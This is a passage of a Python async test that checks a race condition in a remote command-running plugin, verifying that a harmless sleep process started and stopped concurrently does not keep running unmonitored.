        and finds nothing in _active_processes. The process then spawns unmonitored.
        Remediation: Verify process_id is still in _device_running_processes[device_id]
        before spawning subprocess in _execute_and_stream.
        """
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Sleep Race",
            command=f"{sys.executable} -c 'import time; time.sleep(10)'",
            key="cmd_sleep_race",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        start_pkt = _make_req(body={"key": "cmd_sleep_race"})
        stop_pkt = _make_req(body={"stop": True})

        # Send start and stop concurrently
        await asyncio.gather(
            plugin.handle_packet(start_pkt, "peer_race", lambda p: None),
            plugin.handle_packet(stop_pkt, "peer_race", lambda p: None),
        )

        await asyncio.sleep(0.4)
        active_count = len(service._active_processes)
        await plugin.stop()

        # The process should have been cancelled or stopped, not running unmonitored
        assert active_count == 0, (
            f"RACE CONDITION: Process escaped stop packet and is running orphaned in background! (Active: {active_count})"
        )
